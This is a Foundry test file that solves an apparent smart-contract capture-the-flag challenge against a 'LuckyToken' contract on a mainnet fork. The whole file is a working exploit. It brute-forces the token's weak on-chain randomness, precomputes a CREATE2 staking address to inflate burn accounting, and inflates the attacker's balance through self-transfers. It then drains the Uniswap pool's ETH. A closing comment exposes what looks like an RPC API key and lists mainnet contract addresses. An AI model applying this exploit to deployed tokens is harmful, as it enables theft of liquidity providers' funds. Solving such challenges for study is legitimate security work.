// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {LuckyToken} from "../src/LuckyToken.sol";
import {TeamVault} from "../src/TeamVault.sol";
import "../src/interfaces/IUniswapV2Router02.sol";
import "../src/LockStaking.sol";
import "../src/interfaces/IUniswapV2Pair.sol";
import "../src/Challenge.sol";
contract LuckyTokenTest is Test {
    address public deployer = makeAddr("deployer");
    address public team = makeAddr("team");
    address public user = makeAddr("user");
    address public tester = makeAddr("tester");

    LuckyToken token;
    Challenge challenge;
    TeamVault vault;
    IUniswapV2Router02 router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    LockStaking lockStaking;

    function test_Final() public {
        //***************/ TASK DEPLOYMENT \*********************
        console.log(block.number);
        vm.deal(deployer, 100 ether);

        vm.prank(deployer);
        challenge = new Challenge{value: 10 ether}(address(this));

        token = challenge.TOKEN();

        vm.deal(tester, 1 ether);
        address uniswapV2Pair = token.uniswapV2Pair();
        assertEq(
            1 ether,
            payable(tester).balance,
            "tester balance is not 1 ETH"
        );
        assertEq(
            10 ether,
            token.balanceOf(address(uniswapV2Pair)),
            "pool start balance is not 10 token"
        );
        assertEq(
            10 ether,
            IERC20(router.WETH()).balanceOf(address(uniswapV2Pair)),
            "pool start balance is not 10 ETH"
        );

        //***************/ STARTING SOLUTION \*********************
        // ******** FIRST STEP (SWAPPING ETH to TOKEN) ************

        vault = token.teamVault();
        address[] memory path = new address[](2);
        path[0] = router.WETH();
        path[1] = address(token);

        address[] memory path_back = new address[](2);
        path_back[0] = address(token);
        path_back[1] = router.WETH();

        vm.prank(tester);
        router.swapExactETHForTokens{value: 1 ether}( 
            0,
            path,
            tester,
            block.timestamp + 400
        );

        assertEq(0, payable(tester).balance, "tester balance is not 0 ETH");
        assertEq(
            11 ether,
            IERC20(router.WETH()).balanceOf(address(uniswapV2Pair)),
            "pool balance is not 0 ETH"
        );

        // ******** SECOND STEP (TRANSFERS OF 1 WEI FOR PASSING TXCOUNT CHECK) ************
        for (uint i = 0; i < 10; i++) {
            vm.prank(tester);
            token.transfer(tester, 1);
        }

        // ******** THIRD STEP (PRECOMPUTE locked staking address and transfer 2 wei and call release() for increasing totalAmountBurned) ************

        uint256 nonce = uint256(vm.load(address(token), bytes32(uint256(10))));
        //
        address precomputeStaking;
        for (uint160 i = 100; i < 110; i++) {
            address tmp_addr = address(i);

            bytes memory precomputeStakingCode = abi.encodePacked(
                type(LockStaking).creationCode,
                abi.encode(address(token), 12)
            );
            bytes32 salt = bytes32(uint256(uint160(tmp_addr)));

            precomputeStaking = vm.computeCreate2Address(
                salt,
                keccak256(precomputeStakingCode),
                address(vault)
            );

            vm.prank(tester);
            token.transfer(precomputeStaking, 2);

            uint256 tmp_nonce = uint256(
                keccak256(
                    abi.encodePacked(
                        tmp_addr,
                        precomputeStaking,
                        block.timestamp,
                        uint256(1000000000000000000000000),
                        nonce,
                        blockhash(block.number - 1)
                    )
                )
            );
            bool status = ((tmp_nonce % 101) & 1) == 0;
            if (!status) {
                vm.prank(tester);
                token.transfer(precomputeStaking, 2);

                vm.prank(tmp_addr);
                vault.release();
                break;
            }
        }
        
        console.log(block.number);
         assertEq(
            address(vault.lockStaking()),
            precomputeStaking,
            "wrong calculated staking"
        );
        assertEq(
            100000 ether,
            token.totalAmountBurned(),
            "totalAmountBurned is increased"
        );

        // ******** FORTH STEP (precalculating of a nonce for transferring tokens to yourself in order to increase the token balance) ************
        nonce = uint256(vm.load(address(token), bytes32(uint256(10))));
        vm.startPrank(tester);
        for (uint i = 0; i < 10; i++) {
            uint256 jkl1 = uint256(
                keccak256(
                    abi.encodePacked(
                        tx.origin,
                        tester,
                        block.timestamp,
                        token.balanceOf(tester) - 1 - i,
                        nonce,
                        blockhash(block.number - 1)
                    )
                )
            );
            bool status = ((jkl1 % 101) & 1) == 0;
            if (status) {
                    token.transfer(tester, token.balanceOf(tester) - 1 - i);

                    i = 0;
                    nonce = uint256(
                        vm.load(address(token), bytes32(uint256(10)))
                    );
                    if (token.balanceOf(tester) > 100e18) {
                        break;
                    }
            }
        }
        uint256 balance_tester = token.balanceOf(tester);
        assertGt(
            balance_tester,
            100 ether,
            "user balance not greater than 100 ether"
        );
        vm.stopPrank();

        // FIFTH STEP (swap all tokens to drain pool's ETH balance) ************
        vm.prank(tester);
        token.approve(address(router), 2 ** 256 - 1);

        vm.prank(tester);
        token.approve(address(uniswapV2Pair), 2 ** 256 - 1);

        vm.prank(tester);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            balance_tester,
            0,
            path_back,
            tester,
            block.timestamp + 1000
        );

        assertGt(
            payable(tester).balance,
            10 ether,
            "user balance greater than 10 ether"
        );
        assertLt(
            IERC20(router.WETH()).balanceOf(address(uniswapV2Pair)),
            1 ether,
            "pool balance less than 1 ether"
        );
        vm.prank(tester);
        bool result = challenge.isSolved();
        assertEq(true, result, "challenge isn't solved");
        console.log(block.number);

    }
}

//forge test --match-path test/LuckyToken.test.sol --fork-url https://eth-mainnet.g.alchemy.com/v2/2XjCDFrhlb-zI05nvftmEOGMCKlmLMOy --match-test test_Final --fork-block-number 21623600 -vvv 
///21623600
//0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D - router
//0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2 - WETH
//0x8Ad159a275AEE56fb2334DBb69036E9c7baCEe9b - LuckyToken
//0x3849038Bf6569e12f63804799AFa6470fb85602e - pair
